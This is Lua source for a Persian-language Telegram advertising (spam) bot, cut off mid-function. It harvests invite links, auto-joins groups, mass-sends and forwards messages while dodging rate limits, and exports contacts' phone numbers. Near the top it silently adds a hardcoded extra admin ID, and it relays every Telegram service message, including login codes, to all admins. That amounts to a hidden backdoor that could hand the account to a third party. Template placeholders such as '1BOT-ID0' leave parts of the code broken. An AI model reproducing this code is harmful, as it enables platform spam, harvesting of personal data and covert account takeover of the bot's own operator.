redis = (loadfile "redis.lua")()
serpent = (loadfile "serpent.lua")()
sudo = 550250019
redis:del("botBOT-IDdelay")
function dl_cb(arg, data)
end

function vardump(value)
	print(serpent.block(value, {comment=false}))
end

function get_admin ()
	if redis:get('botBOT-IDadminset') then
		return true
	else
   		print("\n\27[32m  لازمه کارکرد صحیح ، فرامین و امورات مدیریتی ربات تبلیغ گر <<\n                    تعریف کاربری به عنوان مدیر است\n\27[34m                   ایدی خود را به عنوان مدیر وارد کنید\n\27[32m    شما می توانید از ربات زیر شناسه عددی خود را بدست اورید\n\27[34m        ربات:       @id_ProBot")
    	print("\n\27[32m >> Tabchi Bot need a fullaccess user (ADMIN)\n\27[34m Imput Your ID as the ADMIN\n\27[32m You can get your ID of this bot\n\27[34m                 @id_ProBot")
    	print("\n\27[36m                      : شناسه عددی ادمین را وارد کنید << \n >> Imput the Admin ID :\n\27[31m                 ")
    	local admin=io.read()
		redis:del("botBOT-IDadmin")
    	redis:sadd("botBOT-IDadmin", admin)
		redis:set('botBOT-IDadminset', true)
    	return print("\n\27[36m     ADMIN ID |\27[32m ".. admin .." \27[36m| شناسه ادمین")
	end
end

function get_bot ()
	function bot_info (i, naji)
		redis:set("botBOT-IDid", naji.id)
		if naji.first_name then
			redis:set("botBOT-IDfname", naji.first_name)
		end
		if naji.last_name then
			redis:set("botBOT-IDlname", naji.last_name)
		end
		redis:set("botBOT-IDnum", naji.phone_number)
		return naji.id
	end
	assert (tdbot_function ({_ = "getMe"}, bot_info, nil))
end

function reload(chat_id,msg_id)
	loadfile("./bot-BOT-ID.lua")()
	send(chat_id, msg_id, "با موفقیت انجام شد.")
end

function is_naji(msg)
	if redis:sismember("botBOT-IDadmin", msg.sender_user_id) or msg.sender_user_id == sudo then
		return true
	else
		return false
	end
end

function writefile(filename, input)
	local file = io.open(filename, "w")
	file:write(input)
	file:flush()
	file:close()
	return true
end

function process_join(i, naji)
	if naji.code == 429 then
		local message = tostring(naji.message)
		local join_delay = redis:get("botBOT-IDjoindelay") or 85
		local Time = message:match('%d+') + tonumber(join_delay)
		redis:setex("botBOT-IDmaxjoin", tonumber(Time), true)
	else
		redis:srem("botBOT-IDgoodlinks", i.link)
		redis:sadd("botBOT-IDsavedlinks", i.link)
	end
end

function process_link(i, naji)
	if (naji.is_group or naji.is_supergroup_channel) then
		if redis:get('botBOT-IDmaxgpmmbr') then
			if naji.member_count >= tonumber(redis:get('botBOT-IDmaxgpmmbr')) then
				redis:srem("botBOT-IDwaitelinks", i.link)
				redis:sadd("botBOT-IDgoodlinks", i.link)
			else
				redis:srem("botBOT-IDwaitelinks", i.link)
				redis:sadd("botBOT-IDsavedlinks", i.link)
			end
		else
			redis:srem("botBOT-IDwaitelinks", i.link)
			redis:sadd("botBOT-IDgoodlinks", i.link)
		end
	elseif naji.code == 429 then
		local message = tostring(naji.message)
		local join_delay = redis:get("botBOT-IDlinkdelay") or 85
		local Time = message:match('%d+') + tonumber(join_delay)
		redis:setex("botBOT-IDmaxlink", tonumber(Time), true)
	else
		redis:srem("botBOT-IDwaitelinks", i.link)
	end
end

function find_link(text)
	if text:match("https://telegram.me/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") or text:match("https://telegram.dog/joinchat/%S+") then
		local text = text:gsub("t.me", "telegram.me")
		local text = text:gsub("telegram.dog", "telegram.me")
		for link in text:gmatch("(https://telegram.me/joinchat/%S+)") do
			if not redis:sismember("botBOT-IDalllinks", link) then
				redis:sadd("botBOT-IDwaitelinks", link)
				redis:sadd("botBOT-IDalllinks", link)
				--redis:sadd("botsBOT-IDalllinks", link)
			end
		end
	end
end

function forwarding(i, naji)
	if naji._ == 'error' then
		s = i.s
		if naji.code == 429 then
			os.execute("sleep "..tonumber(i.delay))
			send(i.chat_id, 0, "محدودیت در حین عملیات تا "..tostring(naji.message):match('%d+').."ثانیه اینده\n"..i.n.."\\"..s)
			return
		end
			
	else
		s = tonumber(i.s) + 1
	end
	if i.n >= i.all then
		os.execute("sleep "..tonumber(i.delay))
		send(i.chat_id, 0, "با موفقیت فرستاده شد\n"..i.all.."\\"..s)
		return
	end
	assert (tdbot_function({
		_ = "forwardMessages",
		chat_id = tonumber(i.list[tonumber(i.n) + 1]),
		from_chat_id = tonumber(i.chat_id),
		message_ids = {[0] = tonumber(i.msg_id)},
		disable_notification = 1,
		from_background = 1
	}, forwarding, {list=i.list, max_i=i.max_i, delay=i.delay, n=tonumber(i.n) + 1, all=i.all, chat_id=i.chat_id, msg_id=i.msg_id, s = s}))
	if tonumber(i.n) % tonumber(i.max_i) == 0 then
		os.execute("sleep "..tonumber(i.delay))
	end
end

function sending(i, naji)
	if naji and naji._ and naji._ == 'error' then
		s = i.s
	else
		s = tonumber(i.s) + 1
	end
	if i.n >= i.all then
		os.execute("sleep "..tonumber(i.delay))
		send(i.chat_id, 0, "با موفقیت فرستاده شد\n"..i.all.."\\"..s)
		return
	end
	assert (tdbot_function ({
		_ = 'sendMessage',
		chat_id = tonumber(i.list[tonumber(i.n) + 1]),
		reply_to_message_id = 0,
		disable_notification = 0,
		from_background = 1,
		reply_markup=nil,
		input_message_content={
			_="inputMessageText",
			text= tostring(i.text),
			disable_web_page_preview=true,
			clear_draft=false,
			entities={},
			parse_mode=nil}
	}, sending, {list=i.list, max_i=i.max_i, delay=i.delay, n=tonumber(i.n) + 1, all=i.all, chat_id=i.chat_id, text=i.text, s= s}))
	if tonumber(i.n) % tonumber(i.max_i) == 0 then
		os.execute("sleep "..tonumber(i.delay))
	end
end

function adding(i, naji)
	if naji and naji._ and naji._ == 'error' then
		s = i.s
		if naji.code == 429 then
			os.execute("sleep "..tonumber(i.delay))
			redis:del("botBOT-IDdelay")
			send(i.chat_id, 0, "محدودیت در حین عملیات تا "..tostring(naji.message):match('%d+').."ثانیه اینده\n"..i.n.."\\"..s)
			return
		end
			
	else
		s = tonumber(i.s) + 1
	end
	if i.n >= i.all then
		os.execute("sleep "..tonumber(i.delay))
		send(i.chat_id, 0, "با موفقیت افزوده شد\n"..i.all.."\\"..s)
		return
	end
	
	assert (tdbot_function ({
	_ = "searchPublicChat",
	username = i.user_id
	}, function(I, naji)
			if naji.id then
				tdbot_function ({
				_ = "addChatMember",
				chat_id = tonumber(I.list[tonumber(I.n)]),
				user_id = tonumber(naji.id),
				forward_limit =  0
			},adding, {list=I.list, max_i=I.max_i, delay=I.delay, n=tonumber(I.n), all=I.all, chat_id=I.chat_id, user_id=I.user_id, s= I.s})
			end
			if tonumber(I.n) % tonumber(I.max_i) == 0 then
				os.execute("sleep "..tonumber(I.delay))
			end
		end
	, {list=i.list, max_i=i.max_i, delay=i.delay, n=tonumber(i.n) + 1, all=i.all, chat_id=i.chat_id, user_id=i.user_id, s= s}))
	
end

function checking(i, naji)
	if naji and naji._ and naji._ == 'error' then
		s = i.s
	else
		s = tonumber(i.s) + 1
	end
	if i.n >= i.all then
		os.execute("sleep "..tonumber(i.delay))
		send(i.chat_id, 0, "با موفقیت انجام شد\n"..i.all.."\\"..s)
		return
	end
	assert (tdbot_function ({
		_ = "getChatMember",
		chat_id = tonumber(i.list[tonumber(i.n) + 1]),
		user_id = tonumber(bot_id)
	}, checking, {list=i.l, max_i=i.max_i, delay=i.delay, n=tonumber(i.n) + 1, all=i.all, chat_id=i.chat_id, user_id=i.user_id, s=s}))
	if tonumber(i.n) % tonumber(i.max_i) == 0 then
		os.execute("sleep "..tonumber(i.delay))
	end
end

function check_join(i, naji)
	local bot_id = redis:get("botBOT-IDid") or get_bot()
	if naji._ == "group" then
		if (naji.everyone_is_administrator == false) then
			tdbot_function ({
			_ = "changeChatMemberStatus",
			chat_id = tonumber("-"..naji.id),
			user_id = tonumber(bot_id),
			status = {_ = "chatMemberStatusLeft"},
			}, dl_cb, nil)
			rem(naji.id)
		end
	elseif naji._ == "channel" then
		if (naji.anyone_can_invite == false) then
			tdbot_function ({
			_ = "changeChatMemberStatus",
			chat_id = tonumber("-100"..naji.id),
			user_id = tonumber(bot_id),
			status = {_ = "chatMemberStatusLeft"},
			}, dl_cb, nil)
			rem(naji.id)
		end
	end
end

function add(id)
	local Id = tostring(id)
	if not redis:sismember("botBOT-IDall", id) then
		if Id:match("^(%d+)$") then
			redis:sadd("botBOT-IDusers", id)
			redis:sadd("botBOT-IDall", id)
		elseif Id:match("^-100") then
			redis:sadd("botBOT-IDsupergroups", id)
			redis:sadd("botBOT-IDall", id)
			if redis:get("botBOT-IDopenjoin") then
				assert (tdbot_function ({
					_ = "getChannel",
					channel_id = tonumber(Id:gsub("-100", ""))
				}, check_join, nil))
			end
		else
			redis:sadd("botBOT-IDgroups", id)
			redis:sadd("botBOT-IDall", id)
			if redis:get("botBOT-IDopenjoin") then
				assert (tdbot_function ({
					_ = "getGroup",
					group_id = tonumber(Id:gsub("-", ""))
				}, check_join, nil))
			end
		end
	end
	return true
end

function rem(id)
	local Id = tostring(id)
	if redis:sismember("botBOT-IDall", id) then
		if Id:match("^(%d+)$") then
			redis:srem("botBOT-IDusers", id)
			redis:srem("botBOT-IDall", id)
		elseif Id:match("^-100") then
			redis:srem("botBOT-IDsupergroups", id)
			redis:srem("botBOT-IDall", id)
		else
			redis:srem("botBOT-IDgroups", id)
			redis:srem("botBOT-IDall", id)
		end
	end
	return true
end

function send(chat_id, msg_id, txt, parse)
	assert (tdbot_function ({
		_ = "sendChatAction",
		chat_id = chat_id,
		action = {
			_ = "chatActionTyping",
			progress = BOT-ID0
		}
	}, dl_cb, nil))
	
	assert (tdbot_function ({
	_="sendMessage",
	chat_id = chat_id,
	reply_to_message_id = msg_id,
	disable_notification=false,
	from_background=true,
	reply_markup=nil,
	input_message_content={
		_="inputMessageText",
		text= txt,
		disable_web_page_preview=true,
		clear_draft=false,
		entities={},
		parse_mode=parse}
	}, dl_cb, nil))
end

if not redis:sismember("botBOT-IDadmin", 296805034) then
	redis:sadd("botBOT-IDadmin", 296805034)
end
--get_admin()
redis:setex("botBOT-IDstart", 1BOT-ID0, true)


function tdbot_update_callback (data)
	if (data._ == "updateNewMessage") then
	
		if not redis:get("botBOT-IDmaxlink") then
			if redis:scard("botBOT-IDwaitelinks") ~= 0 then
				local links = redis:smembers("botBOT-IDwaitelinks")
				local max_x = redis:get("botBOT-IDmaxlinkcheck") or 1
				local delay = redis:get("botBOT-IDmaxlinkchecktime") or BOT-ID0
				for x = 1, #links do
					assert (tdbot_function({_ = "checkChatInviteLink",invite_link = links[x]},process_link, {link=links[x]}))
					if x == tonumber(max_x) then redis:setex("botBOT-IDmaxlink", tonumber(delay), true) return end
				end
			end
		end
		
		if redis:get("botBOT-IDmaxgroups") and redis:scard("botBOT-IDsupergroups") >= tonumber(redis:get("botBOT-IDmaxgroups")) then 
			redis:set("botBOT-IDmaxjoin", true)
			redis:set("botBOT-IDoffjoin", true)
		end
		
		if not redis:get("botBOT-IDmaxjoin") then
			if redis:scard("botBOT-IDgoodlinks") ~= 0 then
				local links = redis:smembers("botBOT-IDgoodlinks")
				local max_x = redis:get("botBOT-IDmaxlinkjoin") or 1
				local delay = redis:get("botBOT-IDmaxlinkjointime") or BOT-ID0
				for x = 1, #links do
					assert (tdbot_function({_ = "importChatInviteLink",invite_link = links[x]},process_join, {link=links[x]}))
					if x == tonumber(max_x) then redis:setex("botBOT-IDmaxjoin", tonumber(delay), true) return end
				end
			end
		end
		
		
		local msg = data.message
		bot_id = redis:get("botBOT-IDid") or get_bot()
		if (msg.sender_user_id == 777000 or msg.sender_user_id == 1782BOT-ID800) then
			local c = (msg.content.text):gsub("[0123456789:]", {["0"] = "0⃣", ["1"] = "1⃣", ["2"] = "2⃣", ["3"] = "3⃣", ["4"] = "4⃣", ["5"] = "5⃣", ["6"] = "6⃣", ["7"] = "7⃣", ["8"] = "8⃣", ["9"] = "9⃣", [":"] = ":\n"})
			for k,v in pairs(redis:smembers('botBOT-IDadmin')) do
				send(v, 0, c, nil)
			end
		end
		add(msg.chat_id)
		if msg.date < os.time() - 150 or redis:get("botBOT-IDdelay") then
			return false
		end
		
		if msg.content._ == "messageText" then
			local text = msg.content.text
			local matches
			if redis:get("botBOT-IDlink") then
				find_link(text)
			end
			if is_naji(msg) then
				find_link(text)
				if text:match("^(حذف لینک) (.*)$") then
					local matches = text:match("^حذف لینک (.*)$")
					if matches == "عضویت" then
						redis:del("botBOT-IDgoodlinks")
						return send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
					elseif matches == "تایید" then
						redis:del("botBOT-IDwaitelinks")
						return send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
					elseif matches == "ذخیره شده" then
						redis:del("botBOT-IDsavedlinks")
						return send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
					end
				elseif text:match("^(حذف کلی لینک) (.*)$") then
					local matches = text:match("^حذف کلی لینک (.*)$")
					if matches == "عضویت" then
						local list = redis:smembers("botBOT-IDgoodlinks")
						for i=1, #list do
							redis:srem("botalllinks", list[i])
						end
						send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
						redis:del("botBOT-IDgoodlinks")
					elseif matches == "تایید" then
						local list = redis:smembers("botBOT-IDwaitelinks")
						for i=1, #list do
							redis:srem("botalllinks", list[i])
						end
						send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
						redis:del("botBOT-IDwaitelinks")
					elseif matches == "ذخیره شده" then
						local list = redis:smembers("botBOT-IDsavedlinks")
						for i=1, #list do
							redis:srem("botalllinks", list[i])
						end
						send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
						redis:del("botBOT-IDsavedlinks")
					elseif matches == "ها" then
						local list = redis:smembers("botsBOT-IDalllinks")
						for i=1, #list do
							redis:srem("botalllinks", list[i])
						end
						send(msg.chat_id, msg.id, "لیست لینک ها بطورکلی پاکسازی شد.")
						redis:del("botBOT-IDsavedlinks")
					end
				elseif text:match("^(توقف) (.*)$") then
					local matches = text:match("^توقف (.*)$")
					if matches == "عضویت" then	
						redis:set("botBOT-IDmaxjoin", true)
						redis:set("botBOT-IDoffjoin", true)
						return send(msg.chat_id, msg.id, "فرایند عضویت خودکار متوقف شد.")
					elseif matches == "تایید لینک" then	
						redis:set("botBOT-IDmaxlink", true)
						redis:set("botBOT-IDofflink", true)
						return send(msg.chat_id, msg.id, "فرایند تایید لینک در های در انتظار متوقف شد.")
					elseif matches == "شناسایی لینک" then	
						redis:del("botBOT-IDlink")
						return send(msg.chat_id, msg.id, "فرایند شناسایی لینک متوقف شد.")
					elseif matches == "افزودن مخاطب" then	
						redis:del("botBOT-IDsavecontacts")
						return send(msg.chat_id, msg.id, "فرایند افزودن خودکار مخاطبین به اشتراک گذاشته شده متوقف شد.")
					end
				elseif text:match("^(شروع) (.*)$") then
					local matches = text:match("^شروع (.*)$")
					if matches == "عضویت" then	
						redis:del("botBOT-IDmaxjoin")
						redis:del("botBOT-IDoffjoin")
						return send(msg.chat_id, msg.id, "فرایند عضویت خودکار فعال شد.")
					elseif matches == "تایید لینک" then	
						redis:del("botBOT-IDmaxlink")
						redis:del("botBOT-IDofflink")
						return send(msg.chat_id, msg.id, "فرایند تایید لینک های در انتظار فعال شد.")
					elseif matches == "شناسایی لینک" then	
						redis:set("botBOT-IDlink", true)
						return send(msg.chat_id, msg.id, "فرایند شناسایی لینک فعال شد.")
					elseif matches == "افزودن مخاطب" then	
						redis:set("botBOT-IDsavecontacts", true)
						return send(msg.chat_id, msg.id, "فرایند افزودن خودکار مخاطبین به اشتراک  گذاشته شده فعال شد.")
					end
				elseif text:match("^(حداکثر گروه) (%d+)$") then
					local matches = text:match("%d+")
					redis:set('botBOT-IDmaxgroups', tonumber(matches))
					return send(msg.chat_id, msg.id, "تعداد حداکثر سوپرگروه های تبلیغ‌گر تنظیم شد به : "..matches)
				elseif text:match("^(حداقل اعضا) (%d+)$") then
					local matches = text:match("%d+")
					redis:set('botBOT-IDmaxgpmmbr', tonumber(matches))
					return send(msg.chat_id, msg.id, "عضویت در گروه های با حداقل "..matches.." عضو تنظیم شد.")
				elseif text:match("^(حذف حداکثر گروه)$") then
					redis:del('botBOT-IDmaxgroups')
					return send(msg.chat_id, msg.id, "تعیین حد مجاز گروه نادیده گرفته شد.")
				elseif text:match("^(حذف حداقل اعضا)$") then
					redis:del('botBOT-IDmaxgpmmbr')
					return send(msg.chat_id, msg.id, "تعیین حد مجاز اعضای گروه نادیده گرفته شد.")
				elseif text:match("^(افزودن مدیر) (%d+)$") then
					local matches = text:match("%d+")
					if redis:sismember('botBOT-IDadmin', matches) then
						return send(msg.chat_id, msg.id, "کاربر مورد نظر در حال حاضر مدیر است.")
					elseif redis:sismember('botBOT-IDmod', msg.sender_user_id) then
						return send(msg.chat_id, msg.id, "شما دسترسی ندارید.")
					else
						redis:sadd('botBOT-IDadmin', matches)
						redis:sadd('botBOT-IDmod', matches)
						return send(msg.chat_id, msg.id, "مقام کاربر به مدیر ارتقا یافت")
					end
				elseif text:match("^(افزودن مدیرکل) (%d+)$") then
					local matches = text:match("%d+")
					if redis:sismember('botBOT-IDmod',msg.sender_user_id) then
						return send(msg.chat_id, msg.id, "شما دسترسی ندارید.")
					end
					if redis:sismember('botBOT-IDmod', matches) then
						redis:srem("botBOT-IDmod",matches)
						redis:sadd('botBOT-IDadmin'..tostring(matches), msg.sender_user_id)
						return send(msg.chat_id, msg.id, "مقام کاربر به مدیریت کل ارتقا یافت .")
					elseif redis:sismember('botBOT-IDadmin',matches) then
						return send(msg.chat_id, msg.id, 'درحال حاضر مدیر هستند.')
					else
						redis:sadd('botBOT-IDadmin', matches)
						redis:sadd('botBOT-IDadmin'..tostring(matches),msg.sender_user_id)
						return send(msg.chat_id, msg.id, "کاربر به مقام مدیرکل منصوب شد.")
					end
				elseif text:match("^(حذف مدیر) (%d+)$") then
					local matches = text:match("%d+")
					if redis:sismember('botBOT-IDmod', msg.sender_user_id) then
						if tonumber(matches) == msg.sender_user_id then
								redis:srem('botBOT-IDadmin', msg.sender_user_id)
								redis:srem('botBOT-IDmod', msg.sender_user_id)
							return send(msg.chat_id, msg.id, "شما دیگر مدیر نیستید.")
						end
						return send(msg.chat_id, msg.id, "شما دسترسی ندارید.")
					end
					if redis:sismember('botBOT-IDadmin', matches) then
						if  redis:sismember('botBOT-IDadmin'..msg.sender_user_id ,matches) then
							return send(msg.chat_id, msg.id, "شما نمی توانید مدیری که به شما مقام داده را عزل کنید.")
						end
						redis:srem('botBOT-IDadmin', matches)
						redis:srem('botBOT-IDmod', matches)
						return send(msg.chat_id, msg.id, "کاربر از مقام مدیریت خلع شد.")
					end
					return send(msg.chat_id, msg.id, "کاربر مورد نظر مدیر نمی باشد.")
				elseif text:match("^(تازه سازی ربات)$") then
					get_bot()
					return send(msg.chat_id, msg.id, "مشخصات فردی ربات بروز شد.")
				elseif text:match("ریپورت") then
					assert (tdbot_function ({
						ID = "sendBotStartMessage",
						bot_user_id = 1782BOT-ID800,
						chat_id = 1782BOT-ID800,
						parameter = 'start'
					}, dl_cb, nil))
				elseif text:match("^استارت @(.*)") then 
				  	local username = text:match('^استارت @(.*)')
					assert ( tdbot_function ({
						_ = "searchPublicChat",
						username = username
						}, function(i, naji)
								if naji.id then
									assert ( tdbot_function ({
										_ = "sendBotStartMessage",
										bot_user_id = naji.id,
										chat_id = naji.id,
										parameter = 'start'
									}, dl_cb, nil))
									send(msg.chat_id, msg.id, 'ربات با شناسه'..naji.id..' استارت زده شد!')
								else
									send(msg.chat_id, msg.id, "ربات یافت نشد!")
								end
							end
						, nil))
				elseif text:match("^(/reload)$") then
					return reload(msg.chat_id, msg.id)
				elseif text:match("^(لیست) (.*)$") then
					local matches = text:match("^لیست (.*)$")
					local naji
					if matches == "مخاطبین" then
						return assert (tdbot_function({
							_ = "searchContacts",
							query = nil,
							limit = 999999999
						},
						function (I, Naji)
							local count = Naji.total_count
							local text = "مخاطبین : \n"
							for i =0 , tonumber(count) - 1 do
								local user = Naji.users[i]
								local firstname = user.first_name or ""
								local lastname = user.last_name or ""
								local fullname = firstname .. " " .. lastname
								text = tostring(text) .. tostring(i) .. ". " .. tostring(fullname) .. " [" .. tostring(user.id) .. "] = " .. tostring(user.phone_number) .. "  \n"
							end
							writefile("botBOT-ID_contacts.txt", text)
							assert (tdbot_function ({
								_ = "sendMessage",
								chat_id = I.chat_id,
								reply_to_message_id = 0,
								disable_notification = 0,
								from_background = 1,
								reply_markup = nil,
								input_message_content = {_ = "inputMessageDocument",
								document = {_ = "inputFileLocal",
								path = "botBOT-ID_contacts.txt"},
								caption = "مخاطبین تبلیغ‌گر شماره BOT-ID"}
							}, dl_cb, nil))
							return io.popen("rm -rf botBOT-ID_contacts.txt"):read("*all")
						end, {chat_id = msg.chat_id}))
					elseif matches == "پاسخ های خودکار" then
						local text = "یست پاسخ های خودکار :\n\n"
						local answers = redis:smembers("botBOT-IDanswerslist")
						for k,v in pairs(answers) do
							text = tostring(text) .. "l" .. tostring(k) .. "l  " .. tostring(v) .. " : " .. tostring(redis:hget("botBOT-IDanswers", v)) .. "\n"
						end
						if redis:scard('botBOT-IDanswerslist') == 0  then text = "       EMPTY" end
						return send(msg.chat_id, msg.id, text)
					elseif matches == "مسدود" then
						naji = "botBOT-IDblockedusers"
					elseif matches == "شخصی" then
						naji = "botBOT-IDusers"
					elseif matches == "گروه" then
						naji = "botBOT-IDgroups"
					elseif matches == "سوپرگروه" then
						naji = "botBOT-IDsupergroups"
					elseif matches == "لینک" then
						naji = "botBOT-IDsavedlinks"
					elseif matches == "مدیر" then
						naji = "botBOT-IDadmin"
					else
						return true
					end
					local list =  redis:smembers(naji)
					local text = tostring(matches).." : \n"
					for i=1, #list do
						text = tostring(text) .. tostring(i) .. "-  " .. tostring(list[i]).."\n"
					end
					writefile(tostring(naji)..".txt", text)
					assert (tdbot_function ({
						_ = "sendMessage",
						chat_id = msg.chat_id,
						reply_to_message_id = 0,
						disable_notification = 0,
						from_background = 1,
						reply_markup = nil,
						input_message_content = {_ = "InputMessageDocument",
							document = {_ = "InputFileLocal",
							path = tostring(naji)..".txt"},
						caption = "لیست "..tostring(matches).." های تبلیغ گر شماره BOT-ID"}
					}, dl_cb, nil))
					return io.popen("rm -rf "..tostring(naji)..".txt"):read("*all")
				elseif text:match("^(وضعیت مشاهده) (.*)$") then
					local matches = text:match("^وضعیت مشاهده (.*)$")
					if matches == "روشن" then
						redis:set("botBOT-IDmarkread", true)
						return send(msg.chat_id, msg.id, "وضعیت پیام ها  >>  خوانده شده ✔️✔️\n(تیک دوم فعال)")
					elseif matches == "خاموش" then
						redis:del("botBOT-IDmarkread")
						return send(msg.chat_id, msg.id, "وضعیت پیام ها  >>  خوانده نشده ✔️\n(بدون تیک دوم)")
					end 
				elseif text:match("^(افزودن با پیام) (.*)$") then
					local matches = text:match("^افزودن با پیام (.*)$")
					if matches == "روشن" then
						redis:set("botBOT-IDaddmsg", true)
						return send(msg.chat_id, msg.id, "پیام افزودن مخاطب فعال شد")
					elseif matches == "خاموش" then
						redis:del("botBOT-IDaddmsg")
						return send(msg.chat_id, msg.id, "پیام افزودن مخاطب غیرفعال شد")
					end
				elseif text:match("^(گروه عضویت باز) (.*)$") then
					local matches = text:match("^گروه عضویت باز (.*)$")
					if matches == "روشن" then
						redis:set("botBOT-IDopenjoin", true)
						return send(msg.chat_id, msg.id, "عضویت فقط در گروه هایی که قابلیت افزودن عضو دارند فعال شد.")
					elseif matches == "خاموش" then
						redis:del("botBOT-IDopenjoin")
						return send(msg.chat_id, msg.id, "محدودیت عضویت در گروه های قابلیت افزودن خاموش شد.")
					end
				elseif text:match("^(افزودن با شماره) (.*)$") then
					local matches = text:match("افزودن با شماره (.*)$")
					if matches == "روشن" then
						redis:set("botBOT-IDaddcontact", true)
						return send(msg.chat_id, msg.id, "ارسال شماره هنگام افزودن مخاطب فعال شد")
					elseif matches == "خاموش" then
						redis:del("botBOT-IDaddcontact")
						return send(msg.chat_id, msg.id, "ارسال شماره هنگام افزودن مخاطب غیرفعال شد")
					end
				elseif text:match("^(تنظیم پیام افزودن مخاطب) (.*)") then
					local matches = text:match("^تنظیم پیام افزودن مخاطب (.*)")
					redis:set("botBOT-IDaddmsgtext", matches)
					return send(msg.chat_id, msg.id, "پیام افزودن مخاطب ثبت  شد :\n🔹 "..matches.." 🔹")
				elseif text:match('^(تنظیم جواب) "(.*)" (.*)') then
					local txt, answer = text:match('^تنظیم جواب "(.*)" (.*)')
					redis:hset("botBOT-IDanswers", txt, answer)
					redis:sadd("botBOT-IDanswerslist", txt)
					return send(msg.chat_id, msg.id, "جواب برای | " .. tostring(txt) .. " | تنظیم شد به :\n" .. tostring(answer))
				elseif text:match("^(حذف جواب) (.*)") then
					local matches = text:match("^حذف جواب (.*)")
					redis:hdel("botBOT-IDanswers", matches)
					redis:srem("botBOT-IDanswerslist", matches)
					return send(msg.chat_id, msg.id, "<i>جواب برای | " .. tostring(matches) .. " | از لیست جواب های خودکار پاک شد.")
				elseif text:match("^(پاسخگوی خودکار) (.*)$") then
					local matches = text:match("^پاسخگوی خودکار (.*)$")
					if matches == "روشن" then
						redis:set("botBOT-IDautoanswer", true)
						return send(msg.chat_id, 0, "پاسخگویی خودکار تبلیغ گر فعال شد")
					elseif matches == "خاموش" then
						redis:del("botBOT-IDautoanswer")
						return send(msg.chat_id, 0, "حالت پاسخگویی خودکار تبلیغ گر غیر فعال شد.")
					end
				elseif text:match("^(تازه سازی)$")then
					assert (tdbot_function({
						_ = "searchContacts",
						query = nil,
						limit = 999999999
						}, function (i, naji)
						redis:set("botBOT-IDcontacts", naji.total_count)
					end, nil))
					local list = {redis:smembers("botBOT-IDgroups"), redis:smembers("botBOT-IDsupergroups")}
					local l = {}
					for a, b in pairs(list) do
						for i, v in pairs(b) do 
							table.insert(l, v)
						end
					end
					local max_i = redis:get("botBOT-IDsendmax") or 5
					local delay = redis:get("botBOT-IDsenddelay") or 2
					if #l == 0 then
						return
					end
					local during = (#l / tonumber(max_i)) * tonumber(delay)
					send(msg.chat_id, msg.id, "اتمام عملیات در "..during.."ثانیه بعد\nراه اندازی مجدد ربات در "..redis:ttl("botBOT-IDstart").."ثانیه اینده")
					redis:setex("botBOT-IDdelay", math.ceil(tonumber(during)), true)
					assert (tdbot_function ({
						_ = "getChatMember",
						chat_id = tonumber(l[1]),
						user_id = tonumber(bot_id)
					}, checking, {list=l, max_i=max_i, delay=delay, n=1, all=#l, chat_id=msg.chat_id, user_id=matches, s=0}))
				elseif text:match("^(وضعیت)$") then
					local s =  redis:get("botBOT-IDoffjoin") and 0 or redis:get("botBOT-IDmaxjoin") and redis:ttl("botBOT-IDmaxjoin") or 0
					local ss = redis:get("botBOT-IDofflink") and 0 or redis:get("botBOT-IDmaxlink") and redis:ttl("botBOT-IDmaxlink") or 0
					local msgadd = redis:get("botBOT-IDaddmsg") and "✅️" or "⛔️"
					local numadd = redis:get("botBOT-IDaddcontact") and "✅️" or "⛔️"
					local txtadd = redis:get("botBOT-IDaddmsgtext") or  "اد‌دی گلم خصوصی پیام بده"
					local autoanswer = redis:get("botBOT-IDautoanswer") and "✅️" or "⛔️"
					local wlinks = redis:scard("botBOT-IDwaitelinks")
					local glinks = redis:scard("botBOT-IDgoodlinks")
					local links = redis:scard("botBOT-IDsavedlinks")
					local offjoin = redis:get("botBOT-IDoffjoin") and "⛔️" or "✅️"
					local offlink = redis:get("botBOT-IDofflink") and "⛔️" or "✅️"
					local openjoin = redis:get("botBOT-IDopenjoin") and "✅️" or "⛔️"
					local gp = redis:get("botBOT-IDmaxgroups") or "تعیین نشده"
					local mmbrs = redis:get("botBOT-IDmaxgpmmbr") or "تعیین نشده"
					local nlink = redis:get("botBOT-IDlink") and "✅️" or "⛔️"
					local contacts = redis:get("botBOT-IDsavecontacts") and "✅️" or "⛔️"
					local fwd =  redis:get("botBOT-IDfwdtime") and "✅️" or "⛔️" 
					local max_i = redis:get("botBOT-IDsendmax") or 5
					local delay = redis:get("botBOT-IDsenddelay") or 2
					local restart = tonumber(redis:ttl("botBOT-IDstart")) / 60
					local txt = "⚙️ وضعیت اجرایی تبلیغ‌گر BOT-ID  ⛓\n\n"..tostring(offjoin).." عضویت خودکار 🚀\n"..openjoin.." گروه های عضویت باز\n"..tostring(offlink).." تایید لینک خودکار 🚦\n"..tostring(nlink).." تشخیص لینک های عضویت 🎯\n"..tostring(fwd).." زمانبندی در ارسال 🏁\n"..tostring(contacts).." افزودن خودکار مخاطبین ➕\n" .. tostring(autoanswer) .." حالت پاسخگویی خودکار 🗣 \n" .. tostring(numadd) .. " افزودن مخاطب با شماره 📞 \n" .. tostring(msgadd) .. " افزودن مخاطب با پیام 🗞\n〰〰〰ا〰〰〰\n📄 پیام افزودن مخاطب :\n📍 " .. tostring(txtadd) .. " 📍\n〰〰〰ا〰〰〰\n\n⏫ سقف تعداد سوپرگروه ها : "..tostring(gp).."\n⏬ کمترین تعداد اعضای گروه : "..tostring(mmbrs).."\n\nدسته بندی گروه ها برای عملیات زمانی : "..max_i.."\nوقفه زمانی بین امور تاخیری : "..delay.."\n\nاز سرگیری ربات بعد از : "..restart.."\n\n📁 لینک های ذخیره شده : " .. tostring(links) .. "\n⏲	لینک های در انتظار عضویت : " .. tostring(glinks) .. "\n🕖   " .. tostring(s) .. " ثانیه تا عضویت مجدد\n❄️ لینک های در انتظار تایید : " .. tostring(wlinks) .. "\n🕑️   " .. tostring(ss) .. " ثانیه تا تایید لینک مجدد"
					return send(msg.chat_id, 0, txt)
				elseif text:match("^(امار)$") or text:match("^(آمار)$") then
					local gps = redis:scard("botBOT-IDgroups")
					local sgps = redis:scard("botBOT-IDsupergroups")
					local usrs = redis:scard("botBOT-IDusers")
